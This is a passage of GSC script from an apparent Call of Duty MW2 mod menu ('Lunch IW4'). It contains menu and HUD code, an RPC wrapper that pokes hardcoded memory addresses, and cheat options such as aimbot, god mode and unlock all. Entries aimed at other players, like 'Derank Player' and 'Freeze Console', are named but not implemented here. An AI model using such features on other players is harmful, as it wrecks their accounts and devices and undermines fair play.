            if (isDefined(player))
                self thread[[func]](int(string), player);
            else
                self thread[[func]](int(string));
            break;
        }
        if (self MeleeButtonPressed()) {
            if (string.size > 0) {
                backspace = "";
                for (a = 0; a < string.size - 1; a++) backspace += string[a];
                string = backspace;
                wait .2;
            } else
                break;
        }
        NumberPad["string"] SetSafeText(string);
        wait .05;
    }
    destroyAll(NumberPad);
    self FreezeControls(false);
}
hudFade(alpha, time) {
    self fadeOverTime(time);
    self.alpha = alpha;
    wait time;
}
hudMoveX(x, time) {
    self moveOverTime(time);
    self.x = x;
    wait time;
}
hudMoveY(y, time) {
    self moveOverTime(time);
    self.y = y;
    wait time;
}
fadeToColor(colour, time) {
    self endon("colors_over");
    self fadeOverTime(time);
    self.color = colour;
}
getClosest(origin, array, ex) {
    if (isDefined(ex) && array.size > 1 && array[0] == ex)
        closest = array[1];
    else
        closest = array[0];
    min = distance(closest.origin, origin);
    for (a = 1; a < array.size; a++) {
        if (isDefined(ex) && array[a] == ex)
            continue;
        if (distance(array[a].origin, origin) < min) {
            min = distance(array[a].origin, origin);
            closest = array[a];
        }
    }
    return closest;
}
isConsole() {
    return level.console;
}
divideColor(c1, c2, c3) {
    return (c1 / 255, c2 / 255, c3 / 255);
}
lastStandSpeed() {
    if (isConsole())
        address = 0x822548D8;
    else
        address = 0x588480;
    RPC(address, -1, 0, "s player_lastStandCrawlSpeedScale 1");
}
SV_GameSendServerCommand(string, player) {
    if (isConsole())
        address = 0x822548D8;
    else
        address = 0x588480;
    RPC(address, player GetEntityNumber(), 0, string);
}
Cbuf_AddText(string) {
    if (isConsole())
        address = 0x82224990;
    else
        address = 0x563D10;
    RPC(address, 0, string);
}
MonitorButtons() {
    if (isDefined(self.MonitoringButtons))
        return;
    self.MonitoringButtons = true;
    if (!isDefined(self.buttonAction))
        self.buttonAction = [
            "+stance", "+gostand", "weapnext", "+actionslot 1", "+actionslot 2",
            "+actionslot 3", "+actionslot 4"
        ];
    if (!isDefined(self.buttonPressed))
        self.buttonPressed = [];
    for (a = 0; a < self.buttonAction.size; a++)
        self thread ButtonMonitor(self.buttonAction[a]);
}
ButtonMonitor(button) {
    self endon("disconnect");
    self.buttonPressed[button] = false;
    self NotifyOnPlayerCommand("button_pressed_" + button, button);
    while (1) {
        self waittill("button_pressed_" + button);
        self.buttonPressed[button] = true;
        wait .025;
        self.buttonPressed[button] = false;
    }
}
isButtonPressed(button) {
    return self.buttonPressed[button];
}
getName() {
    name = self.name;
    if (name[0] != "[")
        return name;
    for (a = name.size - 1; a >= 0; a--)
        if (name[a] == "]")
            break;
    return (GetSubStr(name, a + 1));
}
getPlayers() {
    return level.players;
}
toggledvar(dvar) {
    if (getDvarInt(dvar) == 1)
        setDvar(dvar, 0);
    else
        setDvar(dvar, 1);
}
bindwait(notif, act) {
    self notifyOnPlayerCommand(notif + act, act);
    self waittill(notif + act);
    if (act == "+actionslot 2")
        if (self adsButtonPressed())
            wait 0.25;
}
setupbind(mod, func) {
    if (!isDefined(self.pers["has_" + mod])) {
        self.pers["has_" + mod] = undefined;
    }
    x = self.pers["bind_" + mod];
    if (self.pers["has_" + mod] != undefined) {
        self thread[[func]](x);
    }
}
getNextWeapon() {
    z = self getWeaponsListPrimaries();
    x = self getCurrentWeapon();
    for (i = 0; i < z.size; i++) {
        if (x == z[i]) {
            if (isDefined(z[i + 1]))
                return z[i + 1];
            else
                return z[0];
        }
    }
}
takeFirearm(x) {
    self.firearm["Name"] = x;
    self.firearm["Stock"] = self getWeaponAmmoStock(self.firearm["Name"]);
    self.firearm["Clip"] = self getWeaponAmmoClip(self.firearm["Name"]);
    self takeWeapon(self.firearm["Name"]);
}
giveFirearm() {
    akimbo = false;
    if (isSubStr(self.firearm["Name"], "akimbo"))
        akimbo = true;
    self giveWeapon(self.firearm["Name"], self.loadoutPrimaryCamo, akimbo);
    self setWeaponAmmoClip(self.firearm["Name"], self.firearm["Clip"]);
    self setWeaponAmmoStock(self.firearm["Name"], self.firearm["Stock"]);
}
disableNoobTubes() {
    for (;;) {
        self waittill("weapon_change", newWeapon);
        tokedNewWeapon = StrTok(newWeapon, "_");
        if (tokedNewWeapon[0] == "gl" && !isDefined(level.Noobtubes)) {
            wait 0.2;
            self SetWeaponAmmoClip(newWeapon, 0);
            self SetWeaponAmmoStock(newWeapon, 0);
            self IPrintLnBold(
                "^1Noob tubes are disabled, Use a different weapon!");
            self SwitchToWeapon(self.primaryWeapon);
        }
        wait 0.5;
    }
}
initializeSetup(access, player) {
    if (access == "Admin") {
        player notify("end_menu");
        player.access = access;
        player.pers["has_admin"] = true;
        if (player isMenuOpen())
            player menuClose();
        player.menu = [];
        player.previousMenu = [];
        player.menu["isOpen"] = false;
        player.menu["isLocked"] = undefined;
        if (!isDefined(player.menu["current"]))
            player.menu["current"] = "main";
        if (!isDefined(player.pers["HideSpawnText"])) {
            player waittill("spawned_player");
            player iprintln("Welcome " + player getName() + " to ^6Lunch IW4");
            player iprintln(
                "Press [{+speed_throw}] + [{+actionslot 2}] to Open");
            player.pers["HideSpawnText"] = true;
        }
        wait 1;
        player menuOptions();
        if (!isDefined(player.pers["has_pack"])) {
            player thread menuMonitor();
        }
        player thread callfunctions();
        player thread callaimbots();
        player thread callbinds();
        player thread saveposbind();
        player thread loadposbind();
        player thread ufobind();
        if (!player isHost())
            player.pers["has_softland"] = true;
    } else {
        player notify("end_menu");
        player.access = access;
        if (player isMenuOpen())
            player menuClose();
        player.pers["has_admin"] = undefined;
    }
}
newMenu(menu) {
    if (!isDefined(menu)) {
        menu = self.previousMenu[self.previousMenu.size - 1];
        self.previousMenu[self.previousMenu.size - 1] = undefined;
    } else
        self.previousMenu[self.previousMenu.size] = self getCurrentMenu();
    self setCurrentMenu(menu);
    self menuOptions();
    self setMenuText();
    self refreshTitle();
    self updateScrollbar();
}
addMenu(menu, title) {
    self.storeMenu = menu;
    if (self getCurrentMenu() != menu)
        return;
    self.eMenu = [];
    self.menuTitle = title;
    if (!isDefined(self.menu[menu + "_cursor"]))
        self.menu[menu + "_cursor"] = 0;
}
addOpt(opt, func, p1, p2, p3, p4, p5) {
    if (self.storeMenu != self getCurrentMenu())
        return;
    option = spawnStruct();
    option.opt = opt;
    option.func = func;
    option.p1 = p1;
    option.p2 = p2;
    option.p3 = p3;
    option.p4 = p4;
    option.p5 = p5;
    self.eMenu[self.eMenu.size] = option;
}
addOptDesc(opt, desc, func, p1, p2, p3, p4, p5) {
    if (self.storeMenu != self getCurrentMenu())
        return;
    option = spawnStruct();
    option.opt = opt;
    option.desc = desc;
    option.func = func;
    option.p1 = p1;
    option.p2 = p2;
    option.p3 = p3;
    option.p4 = p4;
    option.p5 = p5;
    self.eMenu[self.eMenu.size] = option;
}
addSlider(opt, val, min, max, mult, func, p1, p2, p3, p4, p5) {
    if (self.storeMenu != self getCurrentMenu())
        return;
    option = spawnStruct();
    option.opt = opt;
    option.val = val;
    option.min = min;
    option.max = max;
    option.mult = mult;
    option.func = func;
    option.p1 = p1;
    option.p2 = p2;
    option.p3 = p3;
    option.p4 = p4;
    option.p5 = p5;
    self.eMenu[self.eMenu.size] = option;
}
addSliderString(opt, ID_list, RL_list, func, p1, p2, p3, p4, p5) {
    if (self.storeMenu != self getCurrentMenu())
        return;
    option = spawnStruct();
    if (!IsDefined(RL_list))
        RL_list = ID_list;
    option.ID_list = strTok(ID_list, ";");
    option.RL_list = strTok(RL_list, ";");
    option.opt = opt;
    option.func = func;
    option.p1 = p1;
    option.p2 = p2;
    option.p3 = p3;
    option.p4 = p4;
    option.p5 = p5;
    self.eMenu[self.eMenu.size] = option;
}
addSliderShader(opt, shaders, ID_list, RL_List, val, val1, func, p1, p2, p3, p4,
    p5) {
    if (self.storeMenu != self getCurrentMenu())
        return;
    option = spawnStruct();
    option.shaders = strTok(shaders, ";");
    if (!IsDefined(RL_list))
        RL_list = ID_list;
    option.ID_list = strTok(ID_list, ";");
    option.RL_list = strTok(RL_list, ";");
    option.val = val;
    option.val1 = val1;
    option.opt = opt;
    option.func = func;
    option.p1 = p1;
    option.p2 = p2;
    option.p3 = p3;
    option.p4 = p4;
    option.p5 = p5;
    self.eMenu[self.eMenu.size] = option;
}
setCurrentMenu(menu) {
    self.menu["current"] = menu;
}
getCurrentMenu(menu) {
    return self.menu["current"];
}
getCursor() {
    return self.menu[self getCurrentMenu() + "_cursor"];
}
isMenuOpen() {
    if (!isDefined(self.menu["isOpen"]) || !self.menu["isOpen"])
        return false;
    return true;
}
packOptions() {
    addMenu("pack", "Lunch Pack");
    addOpt("Show Controls", ::ShowPackInfo);
    addOpt("Unstuck Self", ::UnstuckSelf);
    addOpt("Change Name", ::Keyboard, "Change Name", ::RenamePlayer, self);
    addOpt("Riot Shield Knife", ::riotknifemod);
    addOpt("Predator Knife", ::predknifemod);
    addOpt("Canzooms", ::alwaysCanzooms);
    addOpt("Softlands", ::alwayssoftland);
    addOpt("Shoot Equipment", ::ShootEquipment);
    addOpt("Drop Canswap", ::DropCanswap);
    addOpt("Drop Weapon", ::DropWeapon);
    addOpt("Take Weapon", ::TakeCurrentWeapon);
    addOpt("Give Right TK", ::righthandtk);
    addOpt("Give Glowstick", ::giveGlowstick);
    addOpt("Give Gold Deagle", ::GivePlayerWeapon, "deserteaglegold");
    addOpt("Refill Ammo", ::RefillAmmo);
}
menuOptions(menu) {
    addMenu("main", "Lunch");
    addOpt("Main Mods", ::newMenu, "Main Mods");
    addOpt("Teleport", ::newMenu, "Teleport");
    addOpt("Weapons", ::newMenu, "Weapons");
    addOpt("Killstreaks", ::newMenu, "Killstreaks");
    addOpt("Account", ::newMenu, "Account");
    addOpt("Trickshot", ::newMenu, "Trickshot");
    addOpt("Binds", ::NewMenu, "Binds");
    addOpt("Aimbot", ::newMenu, "Aimbot");
    addOpt("Admin", ::newMenu, "Admin");
    addOpt("Developer", ::newMenu, "Developer");
    addOpt("Bots", ::newMenu, "Bots");
    addOpt("All Players", ::newMenu, "All Players");
    addOpt("Players", ::newMenu, "Players");
    addMenu("Main Mods", "Main Mods");
    addOpt("Fast End", ::fastEndGame);
    addOpt("Revive Teammates", ::AllTeammatesThread, 0,
        "Teammates in Final Stand have been ^6Revived");
    addOpt("God Mode", ::GodMode);
    addOpt("Invisibility", ::Invisibility);
    addOpt("UFO Mode", ::UFOMode);
    addOpt("Infinite Ammo", ::InfiniteAmmo);
    addOpt("No Recoil", ::NoRecoil);
    addOpt("No Spread", ::NoSpread);
    addOpt(@ "UAV", ::UAV);
    addOpt("Red Box", ::RedBox);
    addOpt("Third Person", ::ThirdPerson);
    addOpt("Pro Mod", ::ProMod);
    addOpt("Rename Yourself", ::Keyboard, "Rename Yourself", ::RenamePlayer,
        self);
    addOpt("Chat with the Lobby", ::Keyboard, "Chat with the Lobby", ::ChatWithLobby);
    addOpt("Spawn Text", ::SpawnText);
    addOpt(@ "Suicide", ::SelfSuicide);
    addMenu("Teleport", "Teleport");
    addOpt("Save & Load Binds", ::SavenLoadBinds);
    addOpt("Load Position on Spawn", ::LoadPositionOnSpawn);
    addOpt("Teleport to Sky", ::TeleportToSky);
    addOpt("Teleport to Crosshair", ::TeleportToCrosshair);
    addOpt("Teleport to Custom Location", ::CustomTeleport);
    addOpt("Spec Nade", ::SpecNade);
    addOpt("Rocket Riding", ::RocketRiding);
    addMenu("Weapons", "Weapons");
    addOpt("Take All Weapons", ::TakeWeapons);
    addOpt("Take Current Weapon", ::TakeCurrentWeapon);
    addOpt("Drop Current Weapon", ::DropWeapon);
    addOpt("Refill Weapon Ammo", ::RefillWeaponAmmo);
    addOpt("Refill Grenades", ::RefillGrenades);
    addsliderstring("Assualt Rifles",
        "ak47;m16;m4;fn2000;masada;famas;fal;scar;tavor",
        "AK-47;M16A1;M4A1;FN2000;ACR;FAMAS;FAL;SCAR-H;TAR-21", ::GivePlayerWeapon);
    addsliderstring("Sub Machine Guns", "mp5k;uzi;p90;kriss;ump45",
        "MP5K;Mini-Uzi;P90;Vector;UMP45", ::GivePlayerWeapon);
    addsliderstring("Light Machine Guns", "rpd;sa80;mg4;m240;aug",
        "RPD;L86 LSW;MG4;M240;AUG HBAR", ::GivePlayerWeapon);
    addsliderstring("Sniper Rifles", "cheytac;barrett;wa2000;m21",
        "Intervention;Barrett .50cal;WA2000;M21 EBR", ::GivePlayerWeapon);
    addsliderstring("Machine Pistols", "tmp;glock;beretta393;pp2000",
        "TMP;G18;M93 Raffica;PP2000", ::GivePlayerWeapon);
    addsliderstring("Shotguns",
        "spas12_grip;ranger;model1888;striker;aa12;m1014",
        "SPAS-12 (Grip);Ranger;Model 1888;Striker;AA-12;M1014", ::GivePlayerWeapon);
    addsliderstring("Handguns", "beretta;usp;deserteagle;coltanaconda",
        "M9;USP .45;Desert Eagle;.44 Magnum", ::GivePlayerWeapon);
    addsliderstring("Launchers", "rpg;at4;m79;stinger;javelin",
        "RPG-7;AT4-HS;Thumper;Stinger;Javelin", ::GivePlayerWeapon);
    addOpt(@ "Riotshield", ::GivePlayerWeapon, "riotshield");
    addOpt("Glowstick", ::GiveGlowstick);
    addOpt("Gold Desert Eagle", ::GivePlayerWeapon, "deserteaglegold");
    addOpt("Default Weapon", ::GivePlayerWeapon, "defaultweapon");
    addMenu("Killstreaks", "Killstreaks");
    addOpt("UAV", ::givestreak, "uav");
    addOpt("Care Package", ::givestreak, "airdrop");
    addOpt("Spawn Care Package", ::spawncarepackagecross);
    addOpt("Sentry Gun", ::givestreak, "sentry");
    addOpt("Predator Missile", ::givestreak, "predator_missile");
    addOpt("Harrier Strike", ::givestreak, "harrier_airstrike");
    addOpt("Emergancy Airdrop", ::givestreak, "airdrop_mega");
    addOpt("Stealth Bomber", ::givestreak, "stealth_airstrike");
    addOpt("Chopper Gunner", ::givestreak, "helicopter_minigun");
    addOpt("AC130", ::givestreak, "ac130");
    addOpt("EMP", ::givestreak, "emp");
    addOpt("Nuke", ::givestreak, "nuke");
    addOpt("Delete Carepackages", ::delete_carepack);
    addOpt("Remove Killstreaks", ::removeks);
    addMenu("Account", "Account");
    addOpt("Level 70", ::Level70, self);
    addOpt("Unlock Everything", ::AllChallenges, self);
    addsliderstring(
        "Select Prestige",
        "zero;one;two;three;four;five;six;seven;eight;nine;ten;eleven",
        "0;1;2;3;4;5;6;7;8;9;10;11", ::SetPrestige, self);
    addMenu("Trickshot", "Trickshot");
    addOpt("FFA Fast Last", ::FastLast, @ "FFA");
    addOpt("TDM Fast Last", ::FastLast, @ "TDM");
    addOpt("SND Fast Last", ::FastLast, @ "SND");
    addOpt("Drop Canswap", ::DropCanswap);
    addOpt("Always Canswap (Canzoom)", ::alwaysCanzooms);
    addOpt("Shoot Equipment", ::ShootEquipment);
    addslider("Pickup Radius", 0, 250, 1000, 50, ::pickupradius);
    addOpt("Fake Tag Weapon", ::weaponhitmarkermod);
    addOpt("Set Bounce", ::setbounce);
    addOpt("Delete Bounce", ::delbounce);
    addOpt("Bolt Movement", ::NewMenu, "Bolt Movement");
    addMenu("Binds", "Binds");
    addOpt("Riot Shield Knife", ::riotknifemod);
    addOpt("Predator Knife", ::predknifemod);
    addOpt("Auto Barrel Roll", ::barrelrollmod);
    addOpt("Auto Pistol Nac", ::pistolnacmod);
    addOpt("Auto Shotgun Nac", ::shotgunnacmod);
    addOpt("Reverse Reload", ::reversereloadsmod, "reversereloads");
    addOpt("Smooth Actions", ::smoothactionsmod, "smoothactions");
    addOpt("Nac Swap", ::nacswapmod, "nacswap");
    addOpt("Class Swap", ::classswapmod, "classswap");
    addOpt("G-Flip", ::gflipmod, "gflip");
    addOpt("Walking Sentry", ::sentrymod, "sentry");
    addOpt("Carepackage", ::carepackmod, "carepack");
    addOpt("Predator", ::predcancelmod, "predcancel");
    addOpt("ShaX Swap", ::NewMenu, "ShaX Swap");
    addOpt("Flash Rumble", ::flashmod, "flash");
    addOpt("Third Eye", ::thirdeyemod, "thirdeye");
    addOpt("OMA Illusion", ::OMAIllusion);
    addMenu("ShaX Swap", "ShaX Swap");
    addOpt("ShaX Swap Bind", ::shaxmod, "shax");
    addOpt("ShaX Weapon", ::AllCockback);
    addMenu("Bolt Movement", "Bolt Movement");
    addOpt("Save Position", ::savebolt);
    addOpt("Save 2nd Position", ::savebolt2);
    addOpt("Save 3rd Position", ::savebolt3);
    addOpt("Fix Bolt ADS", ::fixbolt);
    addOpt("Bolt Movement Bind", ::boltmod, "bolt");
    addMenu("Aimbot", "Aimbot");
    addOpt("Explosive Bullets", ::eb);
    addOpt("Select Weapon", ::ebweapon);
    addslider("Explosive Radius", 0, 0, 900, 50, ::ebrange);
    addOpt("Throwing Knife Aimbot", ::ThrowableAimbot);
    addMenu("Admin", "Admin");
    addOpt("Reset Rounds", ::doRoundReset);
    addOpt("Game Mode", ::newMenu, "Game Mode");
    addOpt("Super Jump", ::SuperJump);
    addOpt("Super Speed", ::SuperSpeed);
    addslider("Slow Motion", 1, 0.25, 1, 0.25, ::settimescale);
    addOpt("Nuke Earthquake", ::nukeFakeExplosion);
    addOpt("Anti Join", ::AntiJoin);
    addOpt("Anti Quit", ::AntiQuit);
    addOpt("Add 1 Minute", ::ServerSetLobbyTimer, "add");
    addOpt("Remove 1 Minute", ::ServerSetLobbyTimer, "sub");
    addOpt("Floaters", ::ToggleFloaters);
    addOpt("Noob Tubes", ::toggleNoobtubes);
    addOpt("Remove Death Barriers", ::removeDeathBarrier);
    addOpt("Pause Timer", ::PauseTimer);
    addOpt("Fast Restart", ::ServerRestart);
    addMenu("Game Mode", "Game Mode");
    for (a = 0; a < level.baseGametypes.size; a++)
        self addOpt(level.baseGametypesNames[a], ::ChangeGamemode,
            level.baseGametypes[a]);
    addMenu("Developer", "Developer");
    addOpt("Show Coordinates", ::getCoords);
    addOpt("Show Facing Angle", ::getAngles);
    addOpt("Show GUID", ::getGUIDKid);
    addOpt("Show Current Weapon Name", ::getWeapName);
    addOpt("Show Next Weapon Name", ::getNextWeapName);
    addMenu("Bots", "Bots");
    addOpt("Spawn Enemy Bot", ::AddBot, 1, "enemy");
    addOpt("Spawn Friendly Bot", ::AddBot, 1, "friendly");
    addOpt("Kill Bots", ::BotOptions, 1);
    addOpt("Kick Bots", ::BotOptions, 2);
    addOpt("Freeze Bots", ::BotOptions, 3, "Bots are ^6Frozen");
    addOpt("UnFreeze Bots", ::BotOptions, 4, "Bots are ^1UnFrozen");
    addOpt("Move Bots to Crosshair", ::BotOptions, 5);
    addOpt("Set Bots Spawn Location", ::BotOptions, 6,
        "Bots will now spawn on this location");
    addOpt("Reset Bots Spawn Location", ::BotOptions, 7,
        "Bots will now spawn like normal");
    addOpt("Bots Look at Me", ::BotOptions, 8);
    addOpt("Bots Unsetup", ::BotOptions, 9);
    clientoptions();
}
clientoptions() {
    addMenu("All Players", "All Players");
    addOpt("Kill All Players", ::AllPlayersThread, 0);
    addOpt("Kick All Players", ::AllPlayersThread, 1);
    addOpt("Freeze All Players", ::AllPlayersThread, 2,
        "All players have been ^6Frozen");
    addOpt("UnFreeze All Players", ::AllPlayersThread, 3,
        "All players have been ^1UnFrozen");
    addOpt("Teleport All to Crosshair", ::AllPlayersThread, 4);
    addOpt("Give Everyone Unlock All", ::AllPlayersThread, 5,
        "All players have been given ^6Unlock All");
    addOpt("Give Everyone Prestige 10", ::AllPlayersThread, 6,
        "All players have been given ^6Prestige 10");
    players = GetPlayerArray();
    addMenu("Players", "Players");
    foreach(player in players)
    addOpt(player getName(), ::newMenu, player getName() + " options");
    foreach(player in players) {
        addMenu(player getName() + " options", "Edit Player");
        addOpt("Give Access", ::initializeSetup, "Admin", player);
        addOpt("Take Access", ::initializeSetup, "None", player);
        addOpt("Show GUID", ::getGUIDPlayer, player);
        addOpt("Revive Player", ::RevivePlayer, player);
        addOpt("Kill Player", ::KillPlayer, player);
        addOpt("Kick Player", ::KickPlayer, player);
        addOpt("Freeze Controls", ::FreezePlayer, player);
        addOpt("Send to Sky", ::SendToSky, player);
        addOpt("Send to Crosshairs", ::SendToCrosshairs, player);
        addOpt("Fix Frozen Class", ::FixFrozenClasses, player);
        addOpt("Give Unlock All", ::GiveUnlockAll, player);
        addsliderstring(
            "Give Prestige",
            "zero;one;two;three;four;five;six;seven;eight;nine;ten;eleven",
            "0;1;2;3;4;5;6;7;8;9;10;11", ::SetPrestige, player);
        addOpt("Rename Player", ::Keyboard, "Rename Player", ::RenamePlayer,
            player);
        addOpt("Derank Player", ::attemptDerank, player);
        addOpt("Freeze Console", ::FreezeConsole, player);
        addOpt("Freeze Classes", ::FreezeClasses, player);
        addOpt("Flash Rumble", ::stunMotherfucker, player);
        addOpt("Give FFA Fast Last", ::GiveFFAFastLast, player);
        addOpt("Give Trickshot Aimbot", ::GiveTrickshotAimbot, player);
    }
}
menuMonitor() {
    self endon("disconnected");
    self endon("end_menu");
    while (1) {
        if (!self.menu["isOpen"]) {
            if (self.access != "None" && !self.menu["isLocked"]) {
                if (self AdsButtonPressed() &&
                    self isButtonPressed("+actionslot 2")) {
                    self menuOpen();
                    wait 0.2;
                }
            }
            if (self AdsButtonPressed() &&
                self isButtonPressed("+actionslot 1")) {
                self packOpen();
                wait 0.2;
            }
        } else {
            if (self isButtonPressed("+actionslot 1") ||
                self isButtonPressed("+actionslot 2")) {
                self.menu[self getCurrentMenu() + "_cursor"] +=
                    self isButtonPressed("+actionslot 2");
                self.menu[self getCurrentMenu() + "_cursor"] -=
                    self isButtonPressed("+actionslot 1");
                self scrollingSystem();
                wait 0.05;
            } else if (self isButtonPressed("+actionslot 3") ||
                self isButtonPressed("+actionslot 4")) {
                if (isDefined(self.eMenu[self getCursor()].val) ||
                    IsDefined(self.eMenu[self getCursor()].ID_list)) {
                    if (self isButtonPressed("+actionslot 3"))
                        self updateSlider("L2");
                    if (self isButtonPressed("+actionslot 4"))
                        self updateSlider("R2");
                    wait 0.05;
                }
            } else if (self useButtonPressed()) {
                if (isDefined(self.sliders[self getCurrentMenu() + "_" +
                        self getCursor()])) {
                    slider = self.sliders[self getCurrentMenu() + "_" +
                        self getCursor()];
                    if (IsDefined(self.eMenu[self getCursor()].ID_list))
                        slider = self.eMenu[self getCursor()].ID_list[slider];
                    self thread[[self.eMenu[self getCursor()].func]](
                        slider, self.eMenu[self getCursor()].p1,
                        self.eMenu[self getCursor()].p2,
                        self.eMenu[self getCursor()].p3,
                        self.eMenu[self getCursor()].p4,
                        self.eMenu[self getCursor()].p5);
                } else
                    self thread[[self.eMenu[self getCursor()].func]](
                        self.eMenu[self getCursor()].p1,
                        self.eMenu[self getCursor()].p2,
                        self.eMenu[self getCursor()].p3,
                        self.eMenu[self getCursor()].p4,
                        self.eMenu[self getCursor()].p5);
                wait 0.2;
            } else if (self meleeButtonPressed() ||
                self AdsButtonPressed() &&
                self isButtonPressed("+actionslot 3")) {
                if (self getCurrentMenu() == "main" ||
                    self getCurrentMenu() == "pack")
                    self menuClose();
                else
                    self newMenu();
                wait 0.2;
            }
        }
        wait 0.05;
    }
}
menuOpen() {
    self.menu["isOpen"] = true;
    self.menu["current"] = "main";
    self menuOptions();
    self drawMenu();
    self drawText();
    self updateScrollbar();
}
packOpen() {
    self.menu["isOpen"] = true;
    self.menu["current"] = "pack";
    self packOptions();
    self drawPack();
    self drawPackText();
    self updateScrollbar();
    if (!isDefined(self.pers["HidePackControls"])) {
        self destroyAll(self.pack["CONTROLS"]);
        packCont();
    }
}
menuClose() {
    self destroyAll(self.menu["UI"]);
    self destroyAll(self.menu["OPT"]);
    if (IsDefined(self.menu["UI"]["SLIDER"]))
        self.menu["UI"]["SLIDER"] destroy();
    if (IsDefined(self.menu["UI"]["SLIDER1"]))
        self.menu["UI"]["SLIDER1"] destroy();
    if (!isDefined(self.pers["HidePackControls"])) {
        self destroyAll(self.pack["CONTROLS"]);
        packInfo();
    }
    self.menu["isOpen"] = false;
}
drawMenu() {
    if (!isDefined(self.menu["UI"]))
        self.menu["UI"] = [];
    self.menu["UI"]["BLACK_BLUR"] =
        self createRectangle("CENTER", "CENTER", 0, 20, 149, 191, (0, 0, 0),
            "gradient_center", 1, .9);
    self.menu["UI"]["TOP_BAR_BG"] = self createRectangle(
        "CENTER", "CENTER", 0, -90, 149, 30, self.menuCust["MENU_COLOR"],
        "gradient_center", 3, 1);
    self.menu["UI"]["BOTTOM_BAR_BG"] = self createRectangle(
        "CENTER", "CENTER", 0, 125, 149, 20, self.menuCust["MENU_COLOR"],
        "gradient_center", 3, 1);
    self.menu["UI"]["SCROLL_MAIN"] = self createRectangle(
        "CENTER", "CENTER", 0, -60, 149, 15, self.menuCust["MENU_COLOR"],
        "gradient_center", 2, 1);
    self.menu["UI"]["RIGHT_BAR_BG"] =
        self createRectangle("CENTER", "CENTER", 74, 20, 1, 200,
            self.menuCust["MENU_COLOR"], "white", 2, 1);
    self.menu["UI"]["LEFT_BAR_BG"] =
        self createRectangle("CENTER", "CENTER", -74, 20, 1, 200,
            self.menuCust["MENU_COLOR"], "white", 2, 1);
    self.menu["UI"]["DECODE_SHADER"] = self createRectangle(
        "CENTER", "CENTER", 0, -90, 149, 30, self.menuCust["MENU_COLOR"],
        "decode_characters", 3, .8);
}
drawPack() {
    if (!isDefined(self.menu["UI"]))
        self.menu["UI"] = [];
    self.menu["UI"]["BLACK_BLUR"] =
        self createRectangle("CENTER", "CENTER", 0, 24, 149, 218, (0, 0, 0),
            "gradient_center", 1, .9);
    self.menu["UI"]["TOP_BAR_BG"] = self createRectangle(
        "CENTER", "CENTER", 0, -100, 149, 30, self.menuCust["MENU_COLOR"],
        "gradient_center", 3, 1);
    self.menu["UI"]["BOTTOM_BAR_BG"] = self createRectangle(
        "CENTER", "CENTER", 0, 142, 149, 20, self.menuCust["MENU_COLOR"],
        "gradient_center", 2, 1);
    self.menu["UI"]["SCROLL_MAIN"] = self createRectangle(
        "CENTER", "CENTER", 0, -60, 149, 15, self.menuCust["MENU_COLOR"],
        "gradient_center", 2, 1);
    self.menu["UI"]["RIGHT_BAR_BG"] =
        self createRectangle("CENTER", "CENTER", 74, 27, 1, 235,
            self.menuCust["MENU_COLOR"], "white", 2, 1);
    self.menu["UI"]["LEFT_BAR_BG"] =
        self createRectangle("CENTER", "CENTER", -74, 27, 1, 235,
            self.menuCust["MENU_COLOR"], "white", 2, 1);
    self.menu["UI"]["DECODE_SHADER"] = self createRectangle(
        "CENTER", "CENTER", 0, -100, 149, 30, self.menuCust["MENU_COLOR"],
        "decode_characters", 3, .8);
}
drawText() {
    if (!isDefined(self.menu["OPT"]))
        self.menu["OPT"] = [];
    self.menu["OPT"]["TITLE"] =
        self createText("bigfixed", .6, "LEFT", "CENTER", -70, -90, 3, 1,
            (self.menuTitle), (1, 1, 1));
    self.menu["OPT"]["COUNT"] = self createText("small", 1, "RIGHT", "CENTER",
        70, -88, 4, 1, "", (1, 1, 1));
    self.menu["OPT"]["MENU"] = self createText("small", 1.2, "LEFT", "CENTER",
        -70, -66, 5, 1, "", (1, 1, 1));
    self.menu["OPT"]["INSTRUCT"] =
        self createText("smallfixed", .6, "LEFT", "CENTER", -70, 125, 5, 1,
            "Made by wckd", (1, 1, 1));
    self setMenuText();
}
drawPackText() {
    if (!isDefined(self.menu["OPT"]))
        self.menu["OPT"] = [];
    self.menu["OPT"]["TITLE"] =
        self createText("bigfixed", .6, "LEFT", "CENTER", -70, -100, 3, 1,
            (self.menuTitle), (1, 1, 1));
    self.menu["OPT"]["MENU"] = self createText("small", 1.2, "LEFT", "CENTER",
        -70, -77, 5, 1, "", (1, 1, 1));
    self.menu["OPT"]["INSTRUCT"] =
        self createText("smallfixed", .6, "LEFT", "CENTER", -70, 142, 5, 1,
            "Made by wckd", (1, 1, 1));
    self setMenuText();
}
refreshTitle() {
    self.menu["OPT"]["TITLE"] setSafeText((self.menuTitle));
}
scrollingSystem() {
    if (self.menu["current"] == "pack") {
        if (self getCursor() >= self.eMenu.size || self getCursor() < 0 ||
            self getCursor() == 15) {
            if (self getCursor() <= 0)
                self.menu[self getCurrentMenu() + "_cursor"] =
                self.eMenu.size - 1;
            else if (self getCursor() >= self.eMenu.size)
                self.menu[self getCurrentMenu() + "_cursor"] = 0;
            self setMenuText();
            self updateScrollbar();
        }
        if (self getCursor() >= 16)
            self setMenuText();
        self updateScrollbar();
    } else {
        if (self getCursor() >= self.eMenu.size || self getCursor() < 0 ||
            self getCursor() == 12) {
            if (self getCursor() <= 0)
                self.menu[self getCurrentMenu() + "_cursor"] =
                self.eMenu.size - 1;
            else if (self getCursor() >= self.eMenu.size)
                self.menu[self getCurrentMenu() + "_cursor"] = 0;
            self setMenuText();
            self updateScrollbar();
        }
        if (self getCursor() >= 13)
            self setMenuText();
        self updateScrollbar();
    }
}
updateScrollbar() {
    if (self.menu["current"] == "pack") {
        curs = self getCursor();
        if (curs >= 16)
            curs = 15;
        opt = self.eMenu.size;
        if ((self.eMenu.size >= 16))
            opt = 16;
        size = (opt * 14.4) + 25;
        self.menu["UI"]["BG_IMAGE_BLUR"] setShader("white", 150, int(size));
        self.menu["UI"]["OPT_BG"].y =
            self.menu["UI"]["BG_IMAGE_BLUR"].y + (size - 5);
        self.menu["OPT"]["INSTRUCT"].y =
            self.menu["UI"]["BG_IMAGE_BLUR"].y + (size - 5);
        self.menu["UI"]["SCROLL_MAIN"].y =
            (self.menu["OPT"]["MENU"].y + (curs * 14.4));
        self.menu["OPT"]["INSTRUCT"] setSafeText("Made by wckd");
        if (IsDefined(self.eMenu[self getCursor()].desc))
            self.menu["OPT"]["INSTRUCT"] setSafeText(
                self.eMenu[self getCursor()].desc);
        if (isDefined(self.menu["UI"]["SLIDER"]))
            self.menu["UI"]["SLIDER"] destroy();
        if (IsDefined(self.menu["UI"]["SLIDER1"]))
            self.menu["UI"]["SLIDER1"] destroy();
